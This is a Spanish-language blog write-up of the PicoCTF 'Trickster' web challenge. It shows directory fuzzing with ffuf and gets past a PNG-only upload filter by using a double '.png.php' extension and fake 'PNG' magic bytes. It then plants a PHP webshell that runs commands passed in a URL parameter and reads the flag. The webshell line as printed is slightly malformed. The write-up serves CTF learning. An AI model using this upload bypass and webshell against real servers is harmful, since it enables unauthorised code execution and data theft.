---
layout: single
title: Trickster: PicoCTF
excerpt: "En este challenge dispondremos de una simple página web con una posible subida de archivos de solamente formato .png . Que cambiando los primeros bytes del archivo cual contendrá el código malicio será posible su subida, aunque tenga un.php (debe tener el .png antes de este) y asi, coger la bandera mediante una ejecución remota de comandos RCE via webshell."
date: 2026-01-18
classes: wide
header:
  teaser: /assets/images/pctf-writeup-trickster/logo_trickster.png
  teaser_home_page: true
  icon: /assets/images/picoCTF.webp
categories:
  - PicoCTF
  - Pentesting
  - Challenge
  - Web
tags:
  - writeup
  - challenge
  - HackingWeb
  - Fuzzing
  - FileUpload
  - AbusingFileBytes
  - RemoteAccessRCE
  - WebShell
---

## WRITE UP
IP VÍCITMA: atlas:picoctf.net:58900 (víctima) TTL=  63 LINUX

### ÁNALISIS WEB: RECONOCIMIENTO

De primeras, cuando accedamos a la página vemos que no tiene mucho más que seleccionar una archivo **.png** desde nuestro gestor de archivos y subirlo.

Si usamos la extensión <span style="color:lightyellow">Wappalyzer</span>, no nos saldrá nada acerca de las tecnologías o lenguaje de la página.

Para comprobar el funcionamiento, vamos a probar a subir uno de prueba.

(Ignorar el error). Le damos a "**Upload File**".

Nos dirá que se ha subido exitosamente.

### FUZZING DIRECTORIOS: NIVEL WEB

Con *ffuf* haremos fuzzing a nivel web para descubrir en que ruta se aloja los archivos que subimos en esta web.

```bash
ffuf -c -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://atlas:picoctf.net:58900/FUZZ/ -fc 404 -mc 200,302,403,401
```

Veremos el directorio <span style="color:lightblue">/uploads/</span> que es probablemente donde se aloja dichos archivos.

Si entramos entonces a la siguiente ruta, leeremos el archivo: *Aunque no tengamos acceso, podemos leer los archivos.*

### PROBAR A SUBIR PHP MALICIOSO

Suponiendo que puede leer archivos **php**, vamos a comprobar si metemos este archivo, con un código que si se ejecuta, nos dará la salida el comando "**id**".

```bash
# Crear archivo .php
nano cmd.php

# Insertar código php para ejecutar comandos a definir
<?php system("id"); ?> 
```

En la página, para subirlo filtramos por el campo "All files" y lo seleccionamos.

Al subirlo nos dirá que no contiene la cadena **.png** en el nombre.

### AGREGAR .PNG AL ARCHIVO

Le cambiamos el formato agregando .png antes del .php ya que alomejor puede interpretar que al comprobar que en la cadena del nombre contiene .png, ya no compruebe lo que tiene después.

```bash
mv cmd.php cmd.png.php
```

Lo subimos.

Nos dice que lo que acabamos de subir no es un tipo de **PNG** válido.
Con esto ya sabemos que si hubiésemos intentado un <span style="color:cyan">null Byte</span>, no nos hubiera funcionado.

Ej: ```cmd.php%00.png```

### MAGIC NUMBERS: PRIMEROS BYTES

Bien ahora sabemos que lo esta validando por los primeros bytes del archivos, es decir los "**Magic numbers**".  Esto es útil para identificar un archivo sin tener en cuenta el formato.

Más información: [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

Los primeros bytes de un PNG, serían los siguientes

Si hacemos un **file** para ver que tipo de archivo es nuestro archivo es, lo que hemos subido, nos detecta que se trata de una PHP.

Esto se debe a que los primeros bytes: ``<?php``.

```bash
file cmd.png.php
```

### CAMBIAR BYTES DEL PHP a PNG

(Podemos ponerlo sin ";"). Para que esto sea posible, ponemos en la primera línea: **PNG**<span style="color:orange">;</span> y guardamos.

```php
PNG;
<?php system("id"); ?>
```

Si tiramos nuevamente de **file**, ya no nos dice que es un *PHP* solo un *texto ASCII*.

```bash
file cmd.png.php
```

### CAMBIAR BYTES del PHP a GIF

Vamos a probar probamos con otra cosa, por ejemplo en <span style="color:grey">GIF</span> .

Ponemos en la primera línea del archivo: **GIF8**<span style="color:orange">;</span>

```php
GIF8;
<?php system("id"); ?>
```

Usamos **file** y nos dirá que es un *GIF* solamente.

```bash
file cmd.png.php
```

### SUBIR "FAKE PNG" CON PHP MALICIOSO

Ahora nos toca pasar los bytes a PNG porque sino va a detectar que tiene los primeros bytes de PHP. Como tiene el <span style="color:grey">.png</span>, tendría que funcionar definitivamente.

```php
PNG;
<?php system("id"); ?>
```

Lo seleccionamos y subimos.

Se ha subido correctamente.

### EJECUCIÓN REMOTA DE COMANDOS (RCE) VÍA WEB

Si ejecutamos el archivo, va a interpretar el comando que le pusimos, en este caso "**id**", cual da salida.

```bash
/uploads/cmd.png.php
```

Para verlo mejor, en vez de una sola línea, le damos "**CTRL + U**" para ver el código fuente y que sea más cómodo.

##### WEBSHELL

Ahora que tenemos ejecución remota de comandos, nos daremos una <span style="color:lime">webshell</span>*:
Usaremos etiquetas pre formateadas para permitir una visualización como hemos tenido antes más visual.

```php
<?php <"pre"> . system($_GET["cmd"]) . "</pre>"; ?>
```

Lo cargamos en la página, y ya tendremos para ejecutar comandos cómodamente con la <span style="color:lime">webshell</span> mediante el parámetro **cmd**.

```bash
/uploads/cmd.png.php?cmd=whoami
```

### BANDERA

(**"CTRL + U"**)
Leeremos la bandera alojada en <span style="color:lightblue">/var/www/html</span>.

```bash
/uploads/cmd.png.php?cmd=cd ..; ls; cat GQ4DOOBVMMYGK.txt
```

